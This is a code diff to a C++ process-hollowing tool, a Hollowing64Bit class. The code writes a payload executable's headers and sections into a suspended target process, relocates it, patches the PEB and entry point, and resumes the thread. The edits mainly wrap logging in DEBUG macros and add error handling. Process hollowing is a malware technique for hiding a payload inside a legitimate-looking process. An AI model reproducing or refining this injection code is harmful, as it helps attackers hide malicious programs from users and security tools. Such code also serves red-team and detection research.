@@ -28,7 +28,7 @@ Hollowing64Bit::Hollowing64Bit(const std::string& targetPath, const std::string&
 
 void Hollowing64Bit::hollow()
 {
-    std::cout << "PID: " << _targetProcessInformation.dwProcessId << std::endl;
+    DEBUG(std::cout << "PID: " << _targetProcessInformation.dwProcessId << std::endl);
 
     PEB64 targetPEB = Read64BitProcessPEB(_targetProcessInformation.hProcess);
 
@@ -46,13 +46,14 @@ void Hollowing64Bit::hollow()
         throw HollowingException("An error occured while allocating new memory for the target!");
     }
 
-    std::cout << "New base address: " << std::hex << targetNewBaseAddress << std::endl;
+    DEBUG(std::cout << "New base address: " << std::hex << targetNewBaseAddress << std::endl);
 
     WriteTargetProcessHeaders(targetNewBaseAddress, _payloadBuffer);
 
     UpdateTargetProcessEntryPoint(reinterpret_cast<PBYTE>(targetNewBaseAddress) + payloadNTHeaders->OptionalHeader.AddressOfEntryPoint);
 
     ULONGLONG delta = reinterpret_cast<intptr_t>(targetNewBaseAddress) - payloadNTHeaders->OptionalHeader.ImageBase;
+    DEBUG(std::cout << "Delta: " << std::hex << delta << std::endl);
     if(0 != delta)
     {
         RelocateTargetProcess(delta, targetNewBaseAddress);
@@ -60,8 +61,7 @@ void Hollowing64Bit::hollow()
         UpdateBaseAddressInTargetPEB(targetNewBaseAddress);
     }
 
-
-    std::cout << "Resuming the target's main thread" << std::endl;
+    DEBUG(std::cout << "Resuming the target's main thread" << std::endl);
     
     NtdllFunctions::_NtResumeThread(_targetProcessInformation.hThread, nullptr);
 
@@ -72,8 +72,9 @@ void Hollowing64Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE so
 {
     const PIMAGE_DOS_HEADER sourceDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(sourceFileContents);
     const PIMAGE_NT_HEADERS64 sourceNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(sourceFileContents + sourceDOSHeader->e_lfanew);
-    
-    std::cout << "Writing headers" << std::endl;
+
+    DEBUG(std::cout << "Writing headers" << std::endl);
+
     DWORD oldProtection = 0;
     SIZE_T writtenBytes = 0;
     if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, targetBaseAddress, sourceFileContents,
@@ -88,15 +89,19 @@ void Hollowing64Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE so
     {
         throw HollowingException("An error occured while updating the ImageBase field!");
     }
-    VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders->OptionalHeader.SizeOfHeaders,
-        PAGE_READONLY, &oldProtection);
+    if (0 == VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders->OptionalHeader.SizeOfHeaders,
+        PAGE_READONLY, &oldProtection))
+    {
+        throw HollowingException("An error occured while changing the target's sections' page permissions!");
+    }
 
     for (int i = 0; i < sourceNTHeaders->FileHeader.NumberOfSections; i++)
     {
         PIMAGE_SECTION_HEADER currentSection = reinterpret_cast<PIMAGE_SECTION_HEADER>(sourceFileContents + sourceDOSHeader->e_lfanew +
             sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER)));
         
-        printf("Writing %s\n", currentSection->Name);
+        DEBUG(std::cout << "Writing " << std::string(reinterpret_cast<char*>(currentSection->Name)) << std::endl);
+
         if (ERROR_SUCCESS != NtdllFunctions::_NtWriteVirtualMemory(_targetProcessInformation.hProcess, (reinterpret_cast<PBYTE>(targetBaseAddress) +
             currentSection->VirtualAddress), (sourceFileContents + currentSection->PointerToRawData),
             currentSection->SizeOfRawData, nullptr))
